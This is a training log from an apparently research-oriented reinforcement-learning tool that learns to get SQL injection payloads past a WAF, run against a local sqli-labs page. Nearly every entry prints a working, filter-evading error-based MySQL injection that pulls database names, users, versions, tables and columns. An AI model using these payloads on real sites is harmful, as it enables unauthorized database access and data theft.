/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  Ep 9990 | SR=10% | Steps=14.6 | R=-37.81
  [BYPASS] Ep 9991 | steps=8 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(SeleCt%0a*%0afROM%0a(seLECt%0a((sELect%0acoNCAT(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0afROM%0aInFoRmaTion_schEMa.taBLes%0aw
  Ep 10000 | SR=10% | Steps=14.3 | R=-35.80
  [BYPASS] Ep 10003 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10006 | steps=9 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(sELECT%0a*%0aFRom%0a(selecT%0a((SeLECT%0aJSON_ARRAYAGG(schema_name)%0afROM%0ainfORmAtIoN_SCHEMa.schemata)))a));%00
  Ep 10010 | SR=20% | Steps=13.2 | R=-31.36
  [BYPASS] Ep 10016 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SelecT%0a*%0aFrom%0a(sElEcT%0a((SeLecT%0aJSON_ARRAYAGG(schema_name)%0afROm%0aINfoRMaTioN_scheMa.schemata)))a));%00
  Ep 10020 | SR=10% | Steps=14.1 | R=-34.64
  [BYPASS] Ep 10024 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10025 | steps=5 | seq=newline -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aaND%0aEXP(~(sELEct%0a*%0aFrOm%0a(seLEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 10026 | steps=7 | seq=func_sp_nbsp -> hex_to_char -> newline -> func_sp_nbsp -> case -> null_byte -> agg_swap
           payload: 1'%0aAND%0aEXP(~(sELeCt%0a*%0aFROM%0a(SELECt%0a((selecT%0aJSON_ARRAYAGG(CONCAT(taBLe_schema,CHAR(46),tabLe_name))%0afROm%0aInfOrMATion_ScHEMa.TablEs%0
  [BYPASS] Ep 10030 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10030 | SR=40% | Steps=10.9 | R=-22.18
  [BYPASS] Ep 10036 | steps=5 | seq=null_byte -> null_byte -> func_sp_nbsp -> agg_swap -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10038 | steps=11 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> case -> func_sp_nbsp -> case -> case -> case -> agg_swap -> null_byte
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0afROm%0a(seLEcT%0a((SelecT%0aJSON_ARRAYAGG(column_name)%0afRom%0aiNfOrMAtiON_SCHEMa.columns%0awHEre%0aTABlE_schema=dATaBA
  Ep 10040 | SR=20% | Steps=13.6 | R=-32.82
  [BYPASS] Ep 10043 | steps=6 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(SeLeCT%0a*%0aFrOm%0a(sELeCT%0a((sELEcT%0acoNCaT(CHAR(124),JSON_ARRAYAGG(TaBlE_name),CHAR(124))%0afRoM%0aINFoRMAtIoN_SChEma.TablEs%0aW
  [BYPASS] Ep 10047 | steps=7 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aEXP(~(SElEct%0a*%0aFRoM%0a(selECt%0a((SelECt%0acOnCat(CHAR(124),JSON_ARRAYAGG(TABle_name),CHAR(124))%0aFROM%0aInforMaTIon_sCHEma.tAbles%0aW
  [BYPASS] Ep 10050 | steps=7 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaNd%0aGTID_SUBSET((DAtabaSE%a0()),1);%00
  Ep 10050 | SR=30% | Steps=12.5 | R=-25.21
  [BYPASS] Ep 10055 | steps=5 | seq=agg_swap -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(seleCT%0a*%0aFroM%0a(SeLeCt%0a((sELeCt%0aJSON_ARRAYAGG(column_name)%0afROm%0aINFOrmatIoN_ScHeMA.columns%0aWHeRe%0aTABlE_schema=dAtABA
  [BYPASS] Ep 10056 | steps=13 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0aAND%0aEXP(~(SELect%0a*%0afroM%0a(seLect%0a((sElECt%0aJSON_ARRAYAGG(column_name)%0aFRom%0ainfOrmatIoN_scHeMa.columns%0awHeRe%0atabLE_schema=datABa
  [BYPASS] Ep 10057 | steps=8 | seq=agg_swap -> newline -> case -> agg_swap -> func_sp_nbsp -> case -> hash_nl_all -> null_byte
           payload: 1'%0aand%0aEXP(~(SeLecT%0a*%0afrom%0a(SeLEcT%0a((seleCT%0aJSON_ARRAYAGG(taBLe_name)%0aFrOm%0ainfOrmatioN_sChEMA.TABlEs%0awHeRE%0aTABlE_schema=DAtABase
  [BYPASS] Ep 10059 | steps=3 | seq=func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10060 | SR=40% | Steps=11.9 | R=-24.74
  [BYPASS] Ep 10061 | steps=7 | seq=hex_to_char -> agg_swap -> newline -> agg_swap -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aAnD%0aEXP(~(SeLeCt%0a*%0afROm%0a(seleCt%0a((SElEcT%0aJSON_ARRAYAGG(coNCaT(TAbLe_schema,CHAR(46),table_name))%0afroM%0ainfORMatIon_SCHEmA.taBles%0
  [BYPASS] Ep 10064 | steps=5 | seq=newline -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(selEcT%0a*%0afRom%0a(selecT%0a(user%a0()))a));%00
  [BYPASS] Ep 10065 | steps=8 | seq=hex_to_char -> null_byte -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0aFroM%0a(seLeCT%0a((seleCt%0aJSON_ARRAYAGG(CONCAT(tabLe_schema,CHAR(46),tAbLE_name))%0aFROm%0aInFoRmAtIon_SChemA.tabLes%0
  [BYPASS] Ep 10068 | steps=8 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> case -> null_byte -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(SelEcT%0a*%0aFRom%0a(SElEcT%0a((SEleCT%0aJSON_ARRAYAGG(tABlE_name)%0afRom%0aInFoRMATiOn_scHema.tAblEs%0aWherE%0aTABLE_schema=DaTabaSE
  [BYPASS] Ep 10069 | steps=10 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> agg_swap -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10070 | SR=50% | Steps=11.3 | R=-21.03
  [BYPASS] Ep 10074 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aanD%0aEXP(~(selECT%0a*%0afrOm%0a(sEleCT%0a(version%a0()))a));%00
  Ep 10080 | SR=10% | Steps=13.9 | R=-30.92
  [BYPASS] Ep 10089 | steps=8 | seq=agg_swap -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SELeCt%0a*%0aFRom%0a(sElECt%0a(version%a0()))a));%00
  Ep 10090 | SR=10% | Steps=14.3 | R=-35.45
  [BYPASS] Ep 10093 | steps=6 | seq=hex_to_char -> newline -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(SElEct%0a*%0afrom%0a(seLeCt%0a((sELect%0aJSON_ARRAYAGG(cOncAt(taBlE_schema,CHAR(46),TaBLe_name))%0afroM%0aINForMatIOn_SChEMA.tabLes%0
  [BYPASS] Ep 10097 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10099 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10100 | SR=30% | Steps=11.8 | R=-23.55
  [BYPASS] Ep 10101 | steps=7 | seq=newline -> null_byte -> null_byte -> case -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(seLect%0a*%0aFrOm%0a(SELEct%0a((sElECt%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0aInfORMatiOn_SchEma.schemata)))a));%00
  Ep 10110 | SR=10% | Steps=14.2 | R=-33.41
  [BYPASS] Ep 10115 | steps=5 | seq=func_sp_nbsp -> case -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10116 | steps=5 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(seLECt%0a*%0afroM%0a(selEct%0a(version%a0()))a));%00
  Ep 10120 | SR=20% | Steps=13.0 | R=-31.14
  [BYPASS] Ep 10122 | steps=6 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SeLEcT%0a*%0aFROM%0a(sElECT%0a(user%a0()))a));%00
  [BYPASS] Ep 10124 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10130 | SR=20% | Steps=12.9 | R=-30.10
  [BYPASS] Ep 10134 | steps=5 | seq=newline -> func_sp_nbsp -> gbk_bypass -> null_byte -> case
           payload: 1%bf%27%0aand%0aEXP(~(SeLeCt%0a*%0aFrom%0a(SELEct%0a(version%a0()))a));%00
  [BYPASS] Ep 10135 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> newline -> null_byte -> case -> agg_swap
           payload: 1'%0aand%0aEXP(~(selECt%0a*%0aFrOM%0a(SELeCT%0a((seLecT%0aJSON_ARRAYAGG(TAbLE_name)%0afRom%0ainFoRmATiON_SCHema.TABlEs%0awhErE%0aTabLe_schema=DatAbaSe
  [BYPASS] Ep 10139 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10140 | SR=30% | Steps=12.2 | R=-25.32
  [BYPASS] Ep 10141 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(SeLeCt%0a*%0afRom%0a(SELECt%0a(dAtaBAse%a0()))a));%00
  [BYPASS] Ep 10143 | steps=8 | seq=func_sp_nbsp -> case -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10147 | steps=7 | seq=newline -> func_sp_nbsp -> agg_swap -> case -> agg_swap -> case -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10150 | SR=30% | Steps=12.5 | R=-27.33
  [BYPASS] Ep 10152 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(SElect%0a*%0afRoM%0a(SeLeCt%0a(DAtABasE%a0()))a));%00
  [BYPASS] Ep 10153 | steps=7 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> agg_swap -> agg_swap -> null_byte
           payload: 1'%0aAnd%0aEXP(~(sElecT%0a*%0afROm%0a(sEleCT%0a((SElEcT%0aJSON_ARRAYAGG(column_name)%0afROm%0aInFORmAtIon_scHEMA.columns%0awheRe%0ataBLE_schema=DATaBA
  [BYPASS] Ep 10157 | steps=12 | seq=hex_to_char -> dot_prefix -> newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case -> agg_swap -> case -> agg_swap -> null_byte
           payload: .11'%0aAnd%0aEXP(~(SElect%0a*%0afrOm%0a(sEleCt%0a((selecT%0aJSON_ARRAYAGG(CONCAt(TabLe_schema,CHAR(46),tABlE_name))%0aFROm%0aInFoRMATION_SCHeMa.tabLEs
  Ep 10160 | SR=30% | Steps=12.8 | R=-28.12
  [BYPASS] Ep 10163 | steps=5 | seq=newline -> case -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%0aaNd%0aEXP(~(sELEcT%0a*%0afROM%0a(selECt%0a(DATabASE%a0()))a));%00
  [BYPASS] Ep 10167 | steps=3 | seq=func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10170 | SR=20% | Steps=12.8 | R=-29.51
  [BYPASS] Ep 10171 | steps=11 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(SelEcT%0a*%0afroM%0a(SEleCt%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aiNformAtioN_SChEma.schemata)))a));%00
  [BYPASS] Ep 10173 | steps=10 | seq=agg_swap -> newline -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(selECt%0a*%0aFROm%0a(seLecT%0a((sELEct%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aiNFORmATion_SChemA.schemata)))a));%00
  [BYPASS] Ep 10175 | steps=9 | seq=hex_to_char -> newline -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SElECT%0a*%0aFROM%0a(seleCT%0a((SeLect%0aJSON_ARRAYAGG(CONCAT(tABlE_schema,CHAR(46),TaBLe_name))%0aFrom%0aInForMatiON_SCHEMA.TaBLEs%0
  [BYPASS] Ep 10177 | steps=6 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnd%0aEXP(~(SeLECT%0a*%0afroM%0a(SElEcT%0a((sELEct%0aJSON_ARRAYAGG(TabLe_name)%0aFROm%0aInfOrMatIon_SCHemA.TABlEs%0awhere%0atAblE_schema=DATaBase
  Ep 10180 | SR=40% | Steps=12.6 | R=-26.40
  [BYPASS] Ep 10181 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10184 | steps=9 | seq=null_byte -> newline -> agg_swap -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(SeLECT%0a*%0afrOm%0a(sELect%0a(version%a0()))a));%00
  [BYPASS] Ep 10186 | steps=8 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SELeCt%0a*%0afROm%0a(SeLecT%0a(DAtaBaSe%a0()))a));%00
  Ep 10190 | SR=30% | Steps=12.5 | R=-26.42
  Ep 10200 | SR=0% | Steps=15.0 | R=-37.70
  [BYPASS] Ep 10206 | steps=9 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(sElECt%0a*%0aFROm%0a(sELect%0a((sEleCt%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aiNForMatION_sChEmA.schemata)))a));%00
  [BYPASS] Ep 10210 | steps=6 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(SElECt%0a*%0afROM%0a(sEleCT%0a(dAtabAse%a0()))a));%00
  Ep 10210 | SR=20% | Steps=13.5 | R=-32.78
  [BYPASS] Ep 10211 | steps=4 | seq=func_sp_nbsp -> null_byte -> func_sp_nbsp -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10213 | steps=5 | seq=agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10214 | steps=9 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(seLECt%0a*%0aFrOM%0a(seleCt%0a((seLEcT%0aJSON_ARRAYAGG(column_name)%0aFrOm%0ainfoRmAtIoN_scheMa.columns%0awhERe%0aTABLe_schema=DAtaba
  [BYPASS] Ep 10215 | steps=8 | seq=func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaNd%0aEXP(~(sELEct%0a*%0aFrOM%0a(selEcT%0a(DAtaBasE%a0()))a));%00
  [BYPASS] Ep 10216 | steps=10 | seq=hex_to_char -> null_byte -> newline -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> case -> null_byte -> agg_swap
           payload: 1'%0aaND%0aEXP(~(seLeCt%0a*%0afROm%0a(selECt%0a((sEleCT%0aJSON_ARRAYAGG(CONCAT(TaBLe_schema,CHAR(46),taBle_name))%0afrom%0ainFoRmaTiOn_sCHemA.tAbles%0
  [BYPASS] Ep 10218 | steps=8 | seq=hex_to_char -> hex_to_char -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> newline -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sElect%0a*%0afrom%0a(seLECT%0a((seleCT%0aCONcAt(CHAR(124),JSON_ARRAYAGG(tAblE_name),CHAR(124))%0afroM%0aiNfoRmATiOn_SCHEmA.tabLes%0aw
  Ep 10220 | SR=60% | Steps=10.4 | R=-17.29
  [BYPASS] Ep 10223 | steps=9 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> case_split -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(sELeCT%0a*%0afROM%0a(sElECt%0a((SeLeCT%0aJSON_ARRAYAGG(ConcaT(TABLE_schema,CHAR(46),TABlE_name))%0aFrOM%0ainForMATiON_schemA.TAblEs%0
  [BYPASS] Ep 10225 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10226 | steps=8 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(SELecT%0a*%0afRoM%0a(SelECt%0a((sELECT%0aJSON_ARRAYAGG(tAbLe_name)%0aFrOm%0aiNForMATion_SchEmA.taBLEs%0aWHErE%0aTABLe_schema=daTaBase
  [BYPASS] Ep 10229 | steps=8 | seq=hex_to_char -> newline -> func_sp_nbsp -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aAND%0aEXP(~(sElect%0a*%0aFRoM%0a(SeLEcT%0a((sEleCt%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),TABlE_name))%0aFrOm%0aiNFOrmAtiOn_SCHEMa.tABlEs%0
  Ep 10230 | SR=40% | Steps=11.8 | R=-25.34
  [BYPASS] Ep 10235 | steps=14 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> agg_swap -> null_byte -> null_byte -> crlf -> case
           payload: 1'%0aand%0aEXP(~(SeLECt%0a*%0afroM%0a(SeLEcT%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aInFOrmAtION_SCHeMa.schemata)))a));%00
  [BYPASS] Ep 10237 | steps=10 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(selECT%0a*%0aFROm%0a(SelEct%0a((selEct%0aJSON_ARRAYAGG(column_name)%0afrOM%0ainfoRmaTIoN_schEmA.columns%0aWheRe%0aTAbLE_schema=DatABA
  [BYPASS] Ep 10239 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aaND%0aEXP(~(SELeCT%0a*%0afrOm%0a(SElEct%0a(user%a0()))a));%00
  Ep 10240 | SR=30% | Steps=13.3 | R=-29.46
  Ep 10250 | SR=0% | Steps=15.0 | R=-38.00
  [BYPASS] Ep 10255 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(sELecT%0a*%0afrOm%0a(SELeCt%0a(DatAbAsE%a0()))a));%00
  [BYPASS] Ep 10256 | steps=10 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> agg_swap -> formfeed -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(seLect%0a*%0aFrom%0a(SelecT%0a(user%a0()))a));%00
  [BYPASS] Ep 10258 | steps=11 | seq=agg_swap -> newline -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(sElecT%0a*%0aFrOM%0a(selEcT%0a((SELect%0aJSON_ARRAYAGG(TABle_name)%0afROm%0ainfoRmAtion_schemA.TAblEs%0awHErE%0atAbLE_schema=databASE
  Ep 10260 | SR=30% | Steps=13.1 | R=-30.37
  [BYPASS] Ep 10262 | steps=5 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10270 | steps=5 | seq=agg_swap -> newline -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELeCT%0a*%0aFrOM%0a(seLeCt%0a((SeLEct%0aJSON_ARRAYAGG(column_name)%0afrom%0aINfORMaTIon_SCHemA.columns%0aWhERE%0aTABLe_schema=DataBa
  Ep 10270 | SR=20% | Steps=13.0 | R=-30.30
  [BYPASS] Ep 10273 | steps=11 | seq=hex_to_char -> func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(sElEcT%0a*%0aFrOM%0a(SeLECt%0a((sElECt%0aCoNcAT(CHAR(124),JSON_ARRAYAGG(tAblE_name),CHAR(124))%0aFrOM%0aInfOrmATIoN_SCheMa.TABlEs%0aw
  [BYPASS] Ep 10274 | steps=9 | seq=func_sp_nbsp -> null_byte -> hex_to_char -> newline -> null_byte -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(SElEcT%0a*%0afroM%0a(sElEct%0a((sElECT%0aJSON_ARRAYAGG(tABLe_name)%0aFrOM%0aINFORMation_ScHemA.tablEs%0awhere%0aTAble_schema=daTAbasE
  [BYPASS] Ep 10280 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10280 | SR=30% | Steps=12.8 | R=-30.20
  Ep 10290 | SR=0% | Steps=15.0 | R=-40.95
  [BYPASS] Ep 10292 | steps=11 | seq=agg_swap -> newline -> func_sp_nbsp -> hex_to_char -> crlf -> case -> concat_char -> case -> newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10296 | steps=7 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(seleCT%0a*%0aFROm%0a(SElECt%0a((SeLECt%0aconCAT(CHAR(124),JSON_ARRAYAGG(tABLe_name),CHAR(124))%0afrom%0aInfORmAtion_SChEma.TAbLEs%0aW
  [BYPASS] Ep 10297 | steps=11 | seq=newline -> func_sp_nbsp -> agg_swap -> agg_swap -> newline -> case -> agg_swap -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(SeLECt%0a*%0afROm%0a(SELECt%0a((seleCT%0aJSON_ARRAYAGG(column_name)%0afrom%0aiNFORmAtiON_SChEMA.columns%0aWhere%0aTaBlE_schema=datAbA
  [BYPASS] Ep 10298 | steps=5 | seq=newline -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((DaTAbaSe%a0()),1);%00
  Ep 10300 | SR=40% | Steps=12.4 | R=-26.26
  [BYPASS] Ep 10301 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10302 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10307 | steps=4 | seq=agg_swap -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10308 | steps=7 | seq=newline -> func_sp_nbsp -> null_byte -> case -> null_byte -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SeLEct%0a*%0afRom%0a(selEct%0a((sEleCt%0aJSON_ARRAYAGG(column_name)%0aFrOM%0aInfOrmAtIoN_sCHema.columns%0aWhErE%0aTABle_schema=DatabA
  [BYPASS] Ep 10309 | steps=8 | seq=null_byte -> newline -> agg_swap -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(seLeCt%0a*%0afROM%0a(SelEcT%0a(version%a0()))a));%00
  Ep 10310 | SR=50% | Steps=10.1 | R=-17.93
  [BYPASS] Ep 10313 | steps=9 | seq=hex_to_char -> newline -> null_byte -> func_sp_nbsp -> case -> null_byte -> case -> null_byte -> agg_swap
